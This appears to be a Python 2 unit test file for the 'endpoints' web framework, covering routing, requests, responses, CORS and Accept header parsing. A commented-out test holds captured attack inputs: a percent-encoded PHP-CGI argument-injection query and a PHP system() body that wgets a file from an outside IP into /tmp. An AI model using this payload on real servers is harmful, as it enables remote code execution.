from unittest import TestCase, skipIf, SkipTest
import os
import urlparse
import urllib
import hashlib
import json
import logging
from BaseHTTPServer import BaseHTTPRequestHandler
import time
import threading
import subprocess
import re
import StringIO
import codecs
import base64

import testdata

import endpoints
import endpoints.call
from endpoints.http import Headers
from endpoints.utils import MimeType

try:
    import requests
except ImportError as e:
    requests = None


#logging.basicConfig()
import sys
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
log_handler = logging.StreamHandler(stream=sys.stderr)
log_formatter = logging.Formatter('[%(levelname)s] %(message)s')
log_handler.setFormatter(log_formatter)
logger.addHandler(log_handler)


def create_controller():
    class FakeController(endpoints.Controller, endpoints.CorsMixin):
        def POST(self): pass
        def GET(self): pass

    res = endpoints.Response()

    req = endpoints.Request()
    req.method = 'GET'

    c = FakeController(req, res)
    return c


def create_modules(controller_prefix):
    d = {
        controller_prefix: os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.default".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            "",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass",
            "    def POST(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo.baz".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            "",
            "class Che(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
        "{}.foo.boom".format(controller_prefix): os.linesep.join([
            "from endpoints import Controller",
            "",
            "class Bang(Controller):",
            "    def GET(*args, **kwargs): pass",
            ""
        ]),
    }
    r = testdata.create_modules(d)

    s = set(d.keys())
    return s

class ControllerTest(TestCase):
    def test_cors_mixin(self):
        class Cors(endpoints.Controller, endpoints.CorsMixin):
            def POST(self): pass

        res = endpoints.Response()
        req = endpoints.Request()
        c = Cors(req, res)
        self.assertTrue(c.OPTIONS)
        self.assertFalse('Access-Control-Allow-Origin' in c.response.headers)

        req.set_header('Origin', 'http://example.com')
        c = Cors(req, res)
        self.assertEqual(req.get_header('Origin'), c.response.get_header('Access-Control-Allow-Origin')) 

        req.set_header('Access-Control-Request-Method', 'POST')
        req.set_header('Access-Control-Request-Headers', 'xone, xtwo')
        c = Cors(req, res)
        c.OPTIONS()
        self.assertEqual(req.get_header('Origin'), c.response.get_header('Access-Control-Allow-Origin'))
        self.assertEqual(req.get_header('Access-Control-Request-Method'), c.response.get_header('Access-Control-Allow-Methods')) 
        self.assertEqual(req.get_header('Access-Control-Request-Headers'), c.response.get_header('Access-Control-Allow-Headers')) 

        c = Cors(req, res)
        c.POST()
        self.assertEqual(req.get_header('Origin'), c.response.get_header('Access-Control-Allow-Origin')) 

    def test_bad_typeerror(self):
        """There is a bug that is making the controller method is throw a 404 when it should throw a 500"""
        controller_prefix = "badtypeerror"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self):",
            "        raise TypeError('This should not cause a 404')"
        ])
        testdata.create_module("{}.typerr".format(controller_prefix), contents=contents)

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/typerr'
        c.request = r

        res = c.handle()
        self.assertEqual(500, res.code)

        controller_prefix = "badtypeerror2"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bogus(object):",
            "    def handle_controller(self, foo):",
            "        pass",
            "",
            "class Default(Controller):",
            "    def GET(self):",
            "        b = Bogus()",
            "        b.handle_controller()",
        ])
        testdata.create_module("{}.typerr2".format(controller_prefix), contents=contents)

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/typerr2'
        c.request = r
        res = c.handle()
        self.assertEqual(500, res.code)

class ResponseTest(TestCase):
    def test_headers(self):
        """make sure headers don't persist between class instantiations"""
        r = endpoints.Response()
        r.headers["foo"] = "bar"
        self.assertEqual("bar", r.headers["foo"])
        self.assertEqual(1, len(r.headers))

        r = endpoints.Response()
        self.assertFalse("foo" in r.headers)
        self.assertEqual(0, len(r.headers))

    def test_status(self):
        r = endpoints.Response()
        for code, status in BaseHTTPRequestHandler.responses.iteritems():
            r.code = code
            self.assertEqual(status[0], r.status)
            r.code = None
            r.status = None

        r = endpoints.Response()
        r.code = 1000
        self.assertEqual("UNKNOWN", r.status)

    def test_body(self):
        b = {'foo': 'bar'}

        r = endpoints.Response()
        r.headers['Content-Type'] = 'plain/text'
        self.assertEqual('', r.body)
        r.body = b
        self.assertEqual(str(b), r.body)

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = b
        self.assertEqual(json.dumps(b), r.body)

        r = endpoints.Response()
        r.headers['Content-Type'] = 'plain/text'
        self.assertEqual('', r.body)
        self.assertEqual('', r.body) # Make sure it doesn't change
        r.body = b
        self.assertEqual(str(b), r.body)

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = {}
        self.assertEqual(r.body, "{}")

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = ValueError("this is the message")
        r.code = 500
        self.assertEqual(r.body, '{"errno": 500, "errmsg": "this is the message"}')
        r.headers['Content-Type'] = ''
        self.assertEqual(r.body, "this is the message")

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = None
        self.assertEqual('', r.body) # was getting "null" when content-type was set to json

        # TODO: this really needs to be better tested with unicode data

    def test_body_json_error(self):
        """I was originally going to have the body method smother the error, but
        after thinking about it a little more, I think it is better to bubble up
        the error and rely on the user to handle it in their code"""
        class Foo(object): pass
        b = {'foo': Foo()}

        r = endpoints.Response()
        r.headers['Content-Type'] = 'application/json'
        r.body = b
        with self.assertRaises(TypeError):
            rb = r.body

    def test_code(self):
        r = endpoints.Response()
        self.assertEqual(204, r.code)

        r.body = "this is the body"
        self.assertEqual(200, r.code)

        r.code = 404
        self.assertEqual(404, r.code)

        r.body = "this is the body 2"
        self.assertEqual(404, r.code)

        r.body = None
        self.assertEqual(404, r.code)

        # now let's test defaults
        del(r._code)

        self.assertEqual(204, r.code)

        r.body = ''
        self.assertEqual(200, r.code)

        r.body = {}
        self.assertEqual(200, r.code)


class UrlTest(TestCase):
    def test_create(self):
        u = endpoints.Url("http://example.com/path/part/?query1=val1")
        self.assertEqual("http://example.com/path/part/", u.base.geturl())
        self.assertEqual({"query1": "val1"}, u.query_kwargs)

        u2 = u.modify("/foo/bar", query1="val2")
        self.assertEqual("http://example.com/foo/bar?query1=val2", u2.geturl())

    def test_port(self):
        scheme = "http"
        host = "localhost:9000"
        path = "/path/part"
        query = "query1=val1"
        port = "9000"
        u = endpoints.Url(scheme=scheme, hostname=host, path=path, query=query, port=port)
        self.assertEqual("http://localhost:9000/path/part?query1=val1", u.geturl())

        port = "1000"
        u = endpoints.Url(scheme=scheme, hostname=host, path=path, query=query, port=port)
        self.assertEqual("http://localhost:9000/path/part?query1=val1", u.geturl())

        host = "localhost"
        port = "2000"
        u = endpoints.Url(scheme=scheme, hostname=host, path=path, query=query, port=port)
        self.assertEqual("http://localhost:2000/path/part?query1=val1", u.geturl())

        host = "localhost"
        port = "80"
        u = endpoints.Url(scheme=scheme, hostname=host, path=path, query=query, port=port)
        self.assertEqual("http://localhost/path/part?query1=val1", u.geturl())

        scheme = "https"
        host = "localhost:443"
        port = None
        u = endpoints.Url(scheme=scheme, hostname=host, path=path, query=query, port=port)
        self.assertEqual("https://localhost/path/part?query1=val1", u.geturl())

class RequestTest(TestCase):
    def test_url(self):
        """make sure the .url attribute is correctly populated"""
        # this is wsgi configuration
        r = endpoints.Request()
        r.set_headers({
            "Host": "localhost",
        })
        r.query = "foo=bar"
        r.path = "/baz/che"
        r.environ['wsgi.url_scheme'] = "http"
        r.environ['SERVER_PORT'] = "80"
        u = r.url
        self.assertEqual("http://localhost/baz/che?foo=bar", r.url.geturl())
        r.port = 555
        u = r.url
        self.assertEqual("http://localhost:555/baz/che?foo=bar", r.url.geturl())

        # handle proxied connections
        r.host = "localhost:10000"
        r.port = "9000"
        u = r.url
        self.assertTrue(":10000" in u.geturl())

        # TODO -- simple server configuration

    def test_charset(self):
        r = endpoints.Request()
        r.set_header("content-type", "application/json;charset=UTF-8")
        charset = r.charset
        self.assertEqual("UTF-8", charset)

        r = endpoints.Request()
        r.set_header("content-type", "application/json")
        charset = r.charset
        self.assertEqual(None, charset)

    def test_ip(self):
        r = endpoints.Request()
        r.set_header('x-forwarded-for', '54.241.34.107')
        ip = r.ip
        self.assertEqual('54.241.34.107', ip)

        r.set_header('x-forwarded-for', '127.0.0.1, 54.241.34.107')
        ip = r.ip
        self.assertEqual('54.241.34.107', ip)

        r.set_header('x-forwarded-for', '127.0.0.1')
        r.set_header('client-ip', '54.241.34.107')
        ip = r.ip
        self.assertEqual('54.241.34.107', ip)

    def test_body_kwargs_bad_content_type(self):
        """make sure a form upload content type with json body fails correctly"""
        r = endpoints.Request()
        r.body = u"foo=bar&che=baz&foo=che"
        r.headers = {'content-type': 'application/json'}
        with self.assertRaises(ValueError):
            br = r.body_kwargs

        r.body = u'{"foo": ["bar", "che"], "che": "baz"}'
        r.headers = {'content-type': "application/x-www-form-urlencoded"}

        with self.assertRaises(ValueError):
            br = r.body_kwargs

    def test_body_kwargs(self):
        #body = u"foo=bar&che=baz&foo=che"
        #body_kwargs = {u'foo': [u'bar', u'che'], u'che': u'baz'}
        #body_json = '{"foo": ["bar", "che"], "che": "baz"}'
        cts = {
            u"application/x-www-form-urlencoded": (
                u"foo=bar&che=baz&foo=che",
                {u'foo': [u'bar', u'che'], u'che': u'baz'}
            ),
#             u'application/json': (
#                 '{"foo": ["bar", "che"], "che": "baz"}',
#                 {u'foo': [u'bar', u'che'], u'che': u'baz'}
#             ),
        }

        for ct, bodies in cts.iteritems():
            ct_body, ct_body_kwargs = bodies

            r = endpoints.Request()
            r.body = ct_body
            r.set_header('content-type', ct)
            self.assertTrue(isinstance(r.body_kwargs, dict))
            self.assertEqual(r.body_kwargs, ct_body_kwargs)

            r = endpoints.Request()
            r.set_header('content-type', ct)
            self.assertEqual(r.body_kwargs, {})
            self.assertEqual(r.body, None)

            r = endpoints.Request()
            r.set_header('content-type', ct)
            r.body_kwargs = ct_body_kwargs
            self.assertEqual(r._parse_query_str(r.body), r._parse_query_str(ct_body))

    def test_properties(self):

        path = u'/foo/bar'
        path_args = [u'foo', u'bar']

        r = endpoints.Request()
        r.path = path
        self.assertEqual(r.path, path)
        self.assertEqual(r.path_args, path_args)

        r = endpoints.Request()
        r.path_args = path_args
        self.assertEqual(r.path, path)
        self.assertEqual(r.path_args, path_args)

        query = u"foo=bar&che=baz&foo=che"
        query_kwargs = {u'foo': [u'bar', u'che'], u'che': u'baz'}

        r = endpoints.Request()
        r.query = query
        self.assertEqual(urlparse.parse_qs(r.query, True), urlparse.parse_qs(query, True))
        self.assertEqual(r.query_kwargs, query_kwargs)

        r = endpoints.Request()
        r.query_kwargs = query_kwargs
        self.assertEqual(urlparse.parse_qs(r.query, True), urlparse.parse_qs(query, True))
        self.assertEqual(r.query_kwargs, query_kwargs)

    def test_body(self):
        # simulate a problem I had with a request with curl
        r = endpoints.Request()
        r.method = 'GET'
        r.body = ""
        r.set_headers({
            'PATTERN': u"/",
            'x-forwarded-for': u"127.0.0.1",
            'URI': u"/",
            'accept': u"*/*",
            'user-agent': u"curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8y zlib/1.2.5",
            'host': u"localhost",
            'VERSION': u"HTTP/1.1",
            'PATH': u"/",
            'METHOD': u"GET",
            'authorization': u"Basic SOME_HASH_THAT_DOES_NOT_MATTER="
        })
        self.assertEqual("", r.body)

        r = endpoints.Request()
        r.method = 'POST'

        r.set_header('content-type', u"application/x-www-form-urlencoded")
        r.body = u"foo=bar&che=baz&foo=che"
        body_r = {u'foo': [u'bar', u'che'], u'che': u'baz'}
        self.assertEqual(body_r, r.body_kwargs)


        r.body = None
        #del(r._body_kwargs)
        body_r = {}
        self.assertEqual(body_r, r.body_kwargs)

        r.set_header('content-type', u"application/json")
        r.body = '{"person":{"name":"bob"}}'
        #del(r._body_kwargs)
        body_r = {u'person': {"name":"bob"}}
        self.assertEqual(body_r, r.body_kwargs)

        r.body = u''
        #del(r._body_kwargs)
        body_r = u''
        self.assertEqual(body_r, r.body)

        r.headers = {}
        body = '{"person":{"name":"bob"}}'
        r.body = body
        self.assertEqual(body, r.body)

        r.method = 'GET'
        r.set_header('content-type', u"application/json")
        r.body = None
        self.assertEqual(None, r.body)

    def test_get_header(self):
        r = endpoints.Request()

        r.set_headers({
            'foo': 'bar',
            'Content-Type': 'application/json',
            'Happy-days': 'are-here-again'
        })
        v = r.get_header('foo', 'che')
        self.assertEqual('bar', v)

        v = r.get_header('Foo', 'che')
        self.assertEqual('bar', v)

        v = r.get_header('FOO', 'che')
        self.assertEqual('bar', v)

        v = r.get_header('che', 'che')
        self.assertEqual('che', v)

        v = r.get_header('che')
        self.assertEqual(None, v)

        v = r.get_header('content-type')
        self.assertEqual('application/json', v)

        v = r.get_header('happy-days')
        self.assertEqual('are-here-again', v)


class RouterTest(TestCase):

    def test_mixed_modules_packages(self):
        # make sure a package with modules and other packages will resolve correctly
        controller_prefix = "mmp"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
            "{}.foo".format(controller_prefix): os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
            "{}.foo.bar".format(controller_prefix): os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
            "{}.che".format(controller_prefix): os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller): pass",
            ]),
        })
        r = endpoints.call.Router(controller_prefix)
        self.assertEqual(set(['mmp.foo', 'mmp', 'mmp.foo.bar', 'mmp.che']), r.controllers)

        # make sure just a file will resolve correctly
        controller_prefix = "mmp2"
        testdata.create_module(controller_prefix, os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller): pass",
        ]))
        r = endpoints.call.Router(controller_prefix)
        self.assertEqual(set(['mmp2']), r.controllers)

    def test_routing_module(self):
        controller_prefix = "callback_info"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass"
        ])
        testdata.create_module("{}.foo".format(controller_prefix), contents=contents)
        r = endpoints.call.Router(controller_prefix, ["foo", "bar"])

    def test_routing_package(self):
        basedir = testdata.create_dir()
        controller_prefix = "routepack"
        testdata.create_dir(controller_prefix, tmpdir=basedir)
        contents = os.linesep.join([
            "from endpoints import Controller",
            "",
            "class Default(Controller):",
            "    def GET(self): pass",
            "",
        ])
        f = testdata.create_module(controller_prefix, contents=contents, tmpdir=basedir)

        r = endpoints.call.Router(controller_prefix, [])
        self.assertTrue(controller_prefix in r.controllers)
        self.assertEqual(1, len(r.controllers))

    def test_routing(self):
        """there was a bug that caused errors raised after the yield to return another
        iteration of a body instead of raising them"""
        controller_prefix = "routing1"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self): pass",
            "",
            "class Foo(Controller):",
            "    def GET(self): pass",
            "",
            "class Bar(Controller):",
            "    def GET(self): pass",
        ])
        testdata.create_module(controller_prefix, contents=contents)

        r = endpoints.call.Router(controller_prefix, [])
        self.assertEqual(r.controller_module_name, controller_prefix)
        self.assertEqual(r.controller_class_name, "Default")

        r = endpoints.call.Router(controller_prefix, ["foo", "che", "baz"])
        self.assertEqual(2, len(r.controller_method_args))
        self.assertEqual(r.controller_class_name, "Foo")


class CallTest(TestCase):
    def test_default_match_with_path(self):
        """when the default controller is used, make sure it falls back to default class
        name if the path bit fails to be a controller class name"""
        controller_prefix = "nomodcontroller2"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self, *args, **kwargs):",
            "        return args[0]"
        ])
        testdata.create_module("{}.nmcon".format(controller_prefix), contents=contents)

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/nmcon/8'
        c.request = r
        c.response = endpoints.Response()

        res = c.handle()
        self.assertEqual('"8"', res.body)

    def test_no_match(self):
        """make sure a controller module that imports a class with the same as
        one of the query args doesen't get picked up as the controller class"""
        controller_prefix = "nomodcontroller"
        r = testdata.create_modules({
            "nomod": os.linesep.join([
                "class Nomodbar(object): pass",
                ""
            ]),
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "from nomod import Nomodbar",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/nomodbar' # same name as one of the non controller classes
        c.request = r
        info = c.get_controller_info()

        self.assertEqual('Default', info['class_name'])
        self.assertEqual('nomodcontroller', info['module_name'])
        self.assertEqual('nomodbar', info['args'][0])

    def test_import_error(self):
        controller_prefix = "importerrorcontroller"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "from does_not_exist import FairyDust",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/'
        c.request = r
        with self.assertRaises(endpoints.CallError):
            info = c.get_callback_info()

    def test_get_controller_info_default(self):
        """I introduced a bug on 1-12-14 that caused default controllers to fail
        to be found, this makes sure that bug is squashed"""
        controller_prefix = "controller_info_default"
        r = testdata.create_modules({
            controller_prefix: os.linesep.join([
                "from endpoints import Controller",
                "class Default(Controller):",
                "    def GET(): pass",
                ""
            ])
        })

        c = endpoints.Call(controller_prefix)
        r = endpoints.Request()
        r.method = 'GET'
        r.path = '/'
        c.request = r
        info = c.get_controller_info()
        self.assertEqual(u'Default', info['class_name'])
        self.assertTrue(issubclass(info['class'], endpoints.Controller))


    def test_get_controller_info(self):
        controller_prefix = "controller_info_advanced"
        s = create_modules(controller_prefix)

        ts = [
            {
                'in': dict(method=u"GET", path="/foo/bar/happy/sad"),
                'out': {
                    'module_name': u"controller_info_advanced.foo",
                    'class_name': u'Bar',
                    'args': [u'happy', u'sad'],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/"),
                'out': {
                    'module_name': u"controller_info_advanced",
                    'class_name': u'Default',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/happy"),
                'out': {
                    'module_name': u"controller_info_advanced",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Default',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz/che"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Che',
                    'args': [],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/baz/happy"),
                'out': {
                    'module_name': u"controller_info_advanced.foo.baz",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
            {
                'in': dict(method=u"GET", path="/foo/happy"),
                'out': {
                    'module_name': u"controller_info_advanced.foo",
                    'class_name': u'Default',
                    'args': [u"happy"],
                    'method': u"GET",
                }
            },
        ]

        for t in ts:
            r = endpoints.Request()
            for key, val in t['in'].iteritems():
                setattr(r, key, val)

            c = endpoints.Call(controller_prefix)
            c.request = r

            d = c.get_controller_info()
            for key, val in t['out'].iteritems():
                self.assertEqual(val, d[key])

    def test_callback_info(self):
        controller_prefix = "callback_info"
        r = endpoints.Request()
        r.path = u"/foo/bar"
        r.path_args = [u"foo", u"bar"]
        r.query_kwargs = {u'foo': u'bar', u'che': u'baz'}
        r.method = u"GET"
        c = endpoints.Call(controller_prefix)
        c.request = r

        with self.assertRaises(endpoints.CallError):
            d = c.get_callback_info()

        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def GET(*args, **kwargs): pass"
        ])
        testdata.create_module("{}.foo".format(controller_prefix), contents=contents)

        # if it succeeds, then it passed the test :)
        d = c.get_callback_info()

    def test_public_controller(self):
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Bar(Controller):",
            "    def get(*args, **kwargs): pass"
        ])
        testdata.create_module("controller2.foo2", contents=contents)

        r = endpoints.Request()
        r.path = u"/foo2/bar"
        r.path_args = [u"foo2", u"bar"]
        r.query_kwargs = {u'foo2': u'bar', u'che': u'baz'}
        r.method = u"GET"
        c = endpoints.Call("controller2")
        c.request = r

        # if it succeeds, then it passed the test :)
        with self.assertRaises(endpoints.CallError):
            d = c.get_callback_info()

    def test_handle_redirect(self):
        contents = os.linesep.join([
            "from endpoints import Controller, Redirect",
            "class Testredirect(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise Redirect('http://example.com')"
        ])
        testdata.create_module("controllerhr.handle", contents=contents)

        r = endpoints.Request()
        r.path = u"/handle/testredirect"
        r.path_args = [u'handle', u'testredirect']
        r.query_kwargs = {}
        r.method = u"GET"
        c = endpoints.Call("controllerhr")
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        self.assertEqual(302, res.code)
        self.assertEqual('http://example.com', res.headers['Location'])

    def test_handle_404_typeerror(self):
        """make sure not having a controller is correctly identified as a 404"""
        controller_prefix = "h404te"
        s = create_modules(controller_prefix)
        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/foo/boom'

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        self.assertEqual(404, res.code)

    def test_handle_404_typeerror_2(self):
        """make sure 404 works when a path bit is missing"""
        controller_prefix = "h404te2"
        contents = os.linesep.join([
            "from endpoints import Controller, decorators",
            "class Default(Controller):",
            "    def GET(self, needed_bit, **kwargs):",
            "       return ''",
            "",
            "    def POST(self, needed_bit, **kwargs):",
            "       return ''",
            "",
            "class Htype(Controller):",
            "    def POST(self, needed_bit, **kwargs):",
            "       return ''",
            "",
            "class Hdec(Controller):",
            "    @decorators.param('foo', default='bar')",
            "    def POST(self, needed_bit, **kwargs):",
            "       return ''",
            "",
        ])
        testdata.create_module(controller_prefix, contents=contents)
        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()

        r = endpoints.Request()
        r.method = u'POST'
        r.path = u'/hdec'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

        r = endpoints.Request()
        r.method = u'POST'
        r.path = u'/htype'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

        r = endpoints.Request()
        r.method = u'POST'
        r.path = u'/'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

    def test_handle_404_typeerror_3(self):
        """there was an error when there was only one expected argument, turns out
        the call was checking for "arguments" when the message just had "argument" """
        controller_prefix = "h404te3"
        contents = os.linesep.join([
            "from endpoints import Controller",
            "class Foo(Controller):",
            "    def GET(self): pass",
            "",
        ])
        testdata.create_module(controller_prefix, contents=contents)
        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()

        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/foo/bar/baz'
        r.query = 'che=1&boo=2'
        c.request = r
        res = c.handle()
        self.assertEqual(404, res.code)

    def test_handle_accessdenied(self):
        """raising an AccessDenied error should set code to 401 and the correct header"""
        controller_prefix = "haccessdenied"
        contents = os.linesep.join([
            "from endpoints import Controller, AccessDenied",
            "class Default(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise AccessDenied('basic')",
        ])
        testdata.create_module(controller_prefix, contents=contents)
        r = endpoints.Request()
        r.method = u'GET'
        r.path = u'/'

        c = endpoints.Call(controller_prefix)
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        res.body # we need to cause the body to be handled
        self.assertEqual(401, res.code)
        self.assertTrue('Basic' in res.headers['WWW-Authenticate'])

    def test_handle_callstop(self):
        contents = os.linesep.join([
            "from endpoints import Controller, CallStop",
            "class Testcallstop(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise CallStop(205, None)",
            "class Testcallstop2(Controller):",
            "    def GET(*args, **kwargs):",
            "        raise CallStop(200, 'this is the body')"
        ])
        testdata.create_module("controllerhcs.handlecallstop", contents=contents)

        r = endpoints.Request()
        r.path = u"/handlecallstop/testcallstop"
        r.path_args = [u'handlecallstop', u'testcallstop']
        r.query_kwargs = {}
        r.method = u"GET"
        c = endpoints.Call("controllerhcs")
        c.response = endpoints.Response()
        c.request = r

        res = c.handle()
        self.assertEqual('', res.body)
        self.assertEqual(None, res._body)
        self.assertEqual(205, res.code)

        r.path = u"/handlecallstop/testcallstop2"
        r.path_args = [u'handlecallstop', u'testcallstop2']
        res = c.handle()
        self.assertEqual('"this is the body"', res.body)
        self.assertEqual(200, res.code)

#     def test_bad_query_bad_path(self):
#         """Jarid and I noticed these errors always popping up in the logs, they 
#         are genuine errors but are misidentified as 417 when they should be 404"""
#         return
#         controller_prefix = "badquerybadpath"
#         r = testdata.create_modules({
#             controller_prefix: os.linesep.join([
#                 "from endpoints import Controller",
#                 "class Default(Controller):",
#                 "    def GET(self): pass",
#                 "    def POST(self): pass",
#                 ""
#             ])
#         })
# 
#         c = endpoints.Call(controller_prefix)
#         r = endpoints.Request()
#         r.method = 'GET'
#         r.path = '/foo/bar'
#         #r.query = "%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E"
#         #r.body = '<?php system("wget 78.109.82.33/apache2-default/.a/hb/php01 -O /tmp/.0e1bc.log'
#         c.request = r
# 
#         res = c.handle()
#         pout.v(res)
#         return
#         info = c.get_callback_info()
#         pout.v(info)
# 
#         # with self.assertRaises(endpoints.CallError):
# #             info = c.get_callback_info()


class CallVersioningTest(TestCase):
    def test_get_version(self):
        r = endpoints.Request()
        r.headers = {u'accept': u'application/json;version=v1'}

        c = endpoints.Call("controller")
        c.request = r

        v = c.version
        self.assertEqual(u'v1', v)

    def test_get_version_default(self):
        """turns out, calls were failing if there was no accept header even if there were defaults set"""
        r = endpoints.Request()
        r.headers = {}

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {}
        c.content_type = u'application/json'
        self.assertEqual(None, c.version)

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {u'accept': u'application/json;version=v1'}
        self.assertEqual(u'v1', c.version)

        c = endpoints.Call("controller")
        c.request = r
        c.content_type = None
        with self.assertRaises(ValueError):
            v = c.version

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {u'accept': u'*/*'}
        c.content_type = u'application/json'
        self.assertEqual(None, c.version)

        c = endpoints.Call("controller")
        c.request = r
        r.headers = {u'accept': u'*/*;version=v8'}
        c.content_type = u'application/json'
        self.assertEqual(u'v8', c.version)

    def test_normalize_method(self):
        r = endpoints.Request()
        r.headers = {u'accept': u'application/json;version=v1'}
        r.method = 'POST'

        c = endpoints.Call("foo.bar")
        c.content_type = u'application/json'
        c.request = r

        method = c.get_normalized_method()
        self.assertEqual(u"POST_v1", method)


class AcceptHeaderTest(TestCase):

    def test_init(self):
        ts = [
            (
                u"text/*, text/html, text/html;level=1, */*",
                [
                    u"text/html;level=1",
                    u"text/html",
                    u"text/*",
                    u"*/*"
                ]
            ),
            (
                u'text/*;q=0.3, text/html;q=0.7, text/html;level=1, text/html;level=2;q=0.4, */*;q=0.5',
                [
                    u"text/html;level=1",
                    u"text/html;q=0.7",
                    u"*/*;q=0.5",
                    u"text/html;level=2;q=0.4",
                    "text/*;q=0.3",
                ]
            ),
        ]

        for t in ts:
            a = endpoints.AcceptHeader(t[0])
            for i, x in enumerate(a):
                self.assertEqual(x[3], t[1][i])

    def test_filter(self):
        ts = [
            (
                u"*/*;version=v5", # accept header that is parsed
                (u"application/json", {}), # filter args, kwargs
                1 # how many matches are expected
            ),
            (
                u"*/*;version=v5",
                (u"application/json", {u'version': u'v5'}),
                1
            ),
            (
                u"application/json",
                (u"application/json", {}),
                1
            ),
            (
                u"application/json",
                (u"application/*", {}),
                1
            ),
            (
                u"application/json",
                (u"text/html", {}),
                0
            ),
            (
                u"application/json;version=v1",
                (u"application/json", {u"version": u"v1"}),
                1
            ),
            (
                u"application/json;version=v2",
                (u"application/json", {u"version": u"v1"}),
                0
            ),

        ]

        for t in ts:
            a = endpoints.AcceptHeader(t[0])
            count = 0
            for x in a.filter(t[1][0], **t[1][1]):
                count += 1

            self.assertEqual(t[2], count)


class ReflectTest(TestCase):
    def test_decorators_inherit_2(self):
